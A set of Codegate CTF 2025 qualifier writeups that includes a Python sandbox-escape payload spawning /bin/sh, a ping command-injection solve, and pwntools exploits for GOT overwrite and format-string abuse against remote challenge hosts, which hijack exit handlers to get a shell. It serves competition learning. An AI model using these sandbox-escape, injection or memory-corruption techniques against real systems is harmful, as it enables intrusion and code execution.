@@ -1,0 +1,368 @@
+export const title = "CodegateCTF 2025 Qualifiers";
+
+# Challenge writeups
+
+## misc-safe-python-executor
+
+![restricted python bug](./.images/rpython.png/raw)
+
+Custom class overriding `get_field` to retrieve `system` function, and `\r` to break out of the class scope and run the format payload.
+
+```py open wrap
+class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (string.Formatter.get_field(self, field_name, args, kwargs)[0]("/bin/sh"), ""); \rBaz().format("{0.Random.__init__.__globals__[_os].system}", random)
+```
+
+Solution from previous challenge: [UIUCTF Rattler Read](https://github.com/nikosChalk/ctf-writeups/blob/master/uiuctf23/pyjail/rattler-read/writeup/README.md).
+
+## misc-captcha-world
+
+```text open
+ ######     ###    ########  ########  ######  ##     ##    ###
+##    ##   ## ##   ##     ##    ##    ##    ## ##     ##   ## ##
+##        ##   ##  ##     ##    ##    ##       ##     ##  ##   ##
+##       ##     ## ########     ##    ##       ######### ##     ##
+##       ######### ##           ##    ##       ##     ## #########
+##    ## ##     ## ##           ##    ##    ## ##     ## ##     ##
+ ######  ##     ## ##           ##     ######  ##     ## ##     ##
+##      ##  #######  ########  ##       ########
+##  ##  ## ##     ## ##     ## ##       ##     ##
+##  ##  ## ##     ## ##     ## ##       ##     ##
+##  ##  ## ##     ## ########  ##       ##     ##
+##  ##  ## ##     ## ##   ##   ##       ##     ##
+##  ##  ## ##     ## ##    ##  ##       ##     ##
+ ###  ###   #######  ##     ## ######## ########
+
+Rules
+
+All letters are capitalized.
+Solve the captcha within 1 minute, in all 10 rounds.
+There are 10 rounds.
+
+Round 1
+Solve the captcha
+
+Captcha:
+ ######  ##      ## ##     ## ##     ##  #######
+##    ## ##  ##  ## ##     ## ##     ## ##     ##
+##       ##  ##  ## ##     ## ##     ##        ##
+ ######  ##  ##  ## ######### ##     ##  #######
+      ## ##  ##  ## ##     ##  ##   ##         ##
+##    ## ##  ##  ## ##     ##   ## ##   ##     ##
+ ######   ###  ###  ##     ##    ###     #######
+
+
+Input:
+```
+
+Given 10 captchas, just do the captchas and remote gives you the flag.
+
+## misc-hello-world
+
+![hello world flag](./.images/hello.png/raw)
+
+## crypto-encrypted-flag
+
+Ask claude to solve the crypto:
+![claud1](./.images/claude1.png/raw)
+
+(Sorry the long numbers get cut off in the pdf).
+
+```py open
+import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+# Given values
+n = 54756668623799501273661800933882720939597900879404357288428999230135977601404008182853528728891571108755011292680747299434740465591780820742049958146587060456010412555357258580332452401727868163734930952912198058084689974208638547280827744839358100210581026805806202017050750775163530268755846782825700533559# n value from the output
+e = 65537
+c = 7728462678531582833823897705285786444161591728459008932472145620845644046450565339835113761143563943610957661838221298240392904711373063097593852621109599751303613112679036572669474191827826084312984251873831287143585154570193022386338846894677372327190250188401045072251858178782348567776180411588467032159# Encrypted flag value from the output
+
+# Fermat's factorization
+def fermat_factor(n):
+    a = gmpy2.isqrt(n)
+    if a * a == n:
+        return a, a
+
+    a = a + 1
+    b2 = a * a - n
+    while not gmpy2.is_square(b2):
+        a = a + 1
+        b2 = a * a - n
+
+    b = gmpy2.isqrt(b2)
+    p = a - b
+    q = a + b
+    return p, q
+
+# Factor n
+p, q = fermat_factor(n)
+
+# Calculate private key
+phi = (p - 1) * (q - 1)
+d = gmpy2.invert(e, phi)
+
+# Decrypt
+m = pow(c, d, n)
+flag = long_to_bytes(m).decode()
+
+print("Flag:", flag)
+```
+
+## rev-initial
+
+![rev1](./.images/rev1.png/raw)
+
+Input encryption, and compared to fixed encrypted output. Just reverse the operations on the encrypted output to get the flag.
+
+```py open
+enc = [
+    b"6\xe2.\x86m$\xcd\x94\x1a\x1aF\x9bI\x83a\x15 ",
+    b"\xb2G\xea\rB\xe9=\xe4t\x1b\x16\x8bT.\xaa"
+]
+enc = bytearray(b"".join(enc))
+
+box = [
+    b"E\xb8\x1a\x80G\xcb\xd6\x19\x1dXV\xe26\xe4\'e\xb1s",
+    b"\xe9\\~B|\xdeqa\xf6H\xf5\"W\x1b\xaf\xdb\x8d\x8b\xc0",
+    b"+\xd4\xa1\xcc\xf2\xeb\xbe78\xd9\x1ec\xe3M\x94\x13",
+    b"\xba\x9c\x86\x105\xfcO\xd7\xd3{:\xc9\x8f\xd0$\xf1",
+    b"\x05,S^\x8c\x96=\xa6\xa4n\xcf[m\x04\xed\x12z\x17%",
+    b"4\xdc\xad\xe1 \x91u\x06\xc4tox\x00l\xc2\xab\xa9\x9f",
+    b"\xb0\x163\x90\xcd\xb2<\xaa\x9bQN?\x1cP\xfa\x18\xe8",
+    b"\xb4T\xb9;I\xf9\xb6\x99\x9d}\x0ef\xef\xff\x15\x97U",
+    b"\x0f\xf8!.\x83\xf3\x95\n\xa8\xbc]\xb52\xfd\xf7\xd8",
+    b"&\x89d/\xa7\xca\r\xec\xc3\xfb\xac\xb7\t\xee\x84\x92",
+    b"y\x01\x07\xa2wJ\x02`9\xa0\x93\xbd\x88\xc6\xe5\xe7",
+    b"\xce#\xbb\xdf\x85\xc1Y\xea\xd2\x9a\xe61\x14\xfe\xc5",
+    b"D\x11\x87g\xd1K\xdajR\xbf\x0b\xf4Z\x8a\x08(\xa3\x7f",
+    b"0p\x9e-\x0c\x82\xae@hCv\xe0>\x8e*L\xa5\xd5ir\xc8\x81",
+    b"kF\xc7\xb3\x1f_\x98)\xf0b\x03\xddA"
+]
+box = bytearray(b"".join(box))
+
+for j in range(0x20):
+    shift = j & 6
+    enc[j] = ((enc[j] << shift) | (enc[j] >> (8 - shift))) & 0xff
+for j in range(0x20):
+    enc[j] = box.index(enc[j])
+
+enc[0x1f] ^= enc[0]
+for j in range(0x1e, -1, -1):
+    enc[j] ^= enc[j + 1]
+
+print(enc)
+```
+
+## rev-web-binary
+
+![rev2](./.images/rev2.png/raw)
+
+Another input encryption challenge with fixed encrypted output. Just reverse the operations on the encrypted output to get the flag.
+
+```py open
+check = [
+    b'\x0d\x33\x00\x39\x0e\x03\x01\x23\x0d\x16\x04',
+    b'\x32\x19\x13\x08\x31\x0e\x13\x05\x21\x0c\x16',
+    b'\x11\x24\x0c\x03\x08\x30\x18\x36\x10\x35\x0c',
+    b'\x23\x1d\x24\x19\x06\x11\x24\x19\x06\x14\x00',
+    b'\x00\x00'
+]
+check = b"".join(check)
+
+def decode(part: bytes):
+    a = (part[0] << 2) | (part[1] >> 4)
+    b = ((part[1] & 0x0f) << 4) | ((part[2] >> 2) & 0xf)
+    c = ((part[2] & 3) << 6) | (part[3]);
+    return bytes([a, b, c])
+
+flag = b""
+for i in range(0, len(check), 4):
+    flag += decode(check[i:])
+    print(flag)
+```
+
+## web-ping-tester
+
+![test](./.images/test.png/raw)
+![test](./.images/test-result.png/raw)
+
+The website seems to be inserting the input directly into the ping command. What if we try to use semicolons?
+
+![flag](./.images/flag.png/raw)
+![flag](./.images/flag-result.png/raw)
+
+## pwn-whats-happening
+
+Vulnerability in planet update function that allows negative indexing. Overwrite got entry with win function to get a shell.
+
+![update](./.images/update.png/raw)
+
+```py open
+from pwn import *
+
+context.terminal = ["kitty"]
+script = """
+b win
+c
+"""
+# p = gdb.debug("./deploy/prob", gdbscript=script)
+p = remote("3.37.174.221", "33333")
+# p = process("./deploy/prob")
+file = ELF("./deploy/prob")
+
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b": ", b"-3")
+payload = p64(file.sym.win) + p64(0) + p64(0x401080)
+p.sendlineafter(b": ", payload)
+p.sendlineafter(b": ", b"0.0")
+p.sendlineafter(b": ", b"0")
+
+p.interactive()
+```
+
+## pwn-magic-palette
+
+`printf` call with controlled format string based on pixel data:
+![mp1](./.images/mp1.png/raw)
+
+With this we can send format string payloads embedded in the pixel data, and trigger with the `print_palette` function.
+
+We need to prevent the function from printing the payload multiple times, so we overwrite the `i` loop variable so `print_palette` returns immediately after running the `printf` payload.
+![mp2](./.images/mp2.png/raw)
+
+From here it is just a basic `printf` challenge, since we can control the stack with the `handle_output` array. Use `printf` for arbitrary read/write, leak the pointer mangle cookie, overwrite exit func in the libc with `system("/bin/sh")`.
+
+```py open
+from re import L
+from pwn import *
+import builtins
+from ast import literal_eval
+from subprocess import run
+
+def send(after: bytes, val, line = False):
+    match type(val):
+        case builtins.int | builtins.str:
+            val = f"{val}".encode()
+        case builtins.bytes:
+            pass
+
+    if line: val += b"\n"
+    p.sendafter(after, val)
+
+def sendline(after: bytes, val):
+    send(after, val, line=True)
+
+def move(x: int, y: int):
+    sendline(b"> ", b"2")
+    sendline(b"> ", x)
+    sendline(b"> ", y)
+
+p = remote("43.203.137.197", "54321")
+
+pix = [0x8020] * 0x1000
+off = 6 + 512 + 37
+fmt = f"%{off}$p\n".encode()
+for i, ch in enumerate(fmt):
+    pix[i] = ch | 0x8000
+
+sendline(b"> ", b"1")
+for i in range(0x1000):
+    p.send(p16(pix[i]))
+
+sendline(b"> ", b"3")
+
+leak = int(p.recvline(), 16)
+log.info(f"{leak = :#x}")
+libcbase = leak - 0x29e40
+log.info(f"{libcbase = :#x}")
+p.recvuntil(b"1. ")
+
+move(0, 0)
+
+pix = [0x8020] * 0x1000
+off = 6 + 512 + 8
+fmt = f"%{off}$p\n".encode()
+for i, ch in enumerate(fmt):
+    pix[i] = ch | 0x8000
+
+sendline(b"> ", b"1")
+for i in range(0x1000):
+    p.send(p16(pix[i]))
+
+sendline(b"> ", b"3")
+
+leak = int(p.recvline(), 16)
+log.info(f"{leak = :#x}")
+frame = leak - 0x1080
+log.info(f"{frame = :#x}")
+p.recvuntil(b"1. ")
+
+def writebyte(addr: int, byte: int):
+    pix = [0x8020] * 0x1000
+
+    addroff = 38 + 6
+    fixupoff1 = 39 + 6
+    fixupoff2 = 40 + 6
+    fmt: bytes = b""
+    if byte > 0:
+        fmt += f"%{byte}c".encode()
+    fmt += f"%{addroff}$hhn".encode()
+    fmt += f"%256c%{fixupoff1}$n%{fixupoff2}$n".encode()
+    fmt = fmt.ljust(0x100)
+    fmt += p64(addr)
+    fmt += p64(frame + 0x1c)
+    fmt += p64(frame + 0x18)
+
+    for i, ch in enumerate(fmt):
+        pix[i] = ch | 0x8000
+
+    move(0, 0)
+    sendline(b"> ", b"1")
+    for i in range(0x1000):
+        p.send(p16(pix[i]))
+
+    sendline(b"> ", b"3")
+
+def readbytes(addr: int):
+    pix = [0x8020] * 0x1000
+
+    addroff = 38 + 6
+    fixupoff1 = 39 + 6
+    fixupoff2 = 40 + 6
+    fmt: bytes = b""
+    fmt += f"%{addroff}$s".encode()
+    fmt += f"%256c%{fixupoff1}$n%{fixupoff2}$n".encode()
+    fmt = fmt.ljust(0x100)
+    fmt += p64(addr)
+    fmt += p64(frame + 0x1c)
+    fmt += p64(frame + 0x18)
+
+    for i, ch in enumerate(fmt):
+        pix[i] = ch | 0x8000
+
+    move(0, 0)
+    sendline(b"> ", b"1")
+    for i in range(0x1000):
+        p.send(p16(pix[i]))
+
+    sendline(b"> ", b"3")
+
+libc = ELF("libc.so.6", checksec=False)
+libc.address = libcbase
+fsbase = libcbase - 0x28c0
+
+readbytes(fsbase + 0x30)
+cookie = u64(p.recv(8))
+log.info(f"{cookie = :#x}")
+
+mask = (1 << 64) -1
+system = libc.sym.system ^ cookie
+system = (system << 0x11) | (system >> (64 - 0x11))
+system = p64(system & mask)
+for i in range(8):
+    writebyte(libc.sym.initial + 0x18 + i, system[i])
+shell = p64(next(libc.search(b"/bin/sh\0")))
+for i in range(8):
+    writebyte(libc.sym.initial + 0x20 + i, shell[i])
+
+p.interactive()
+```
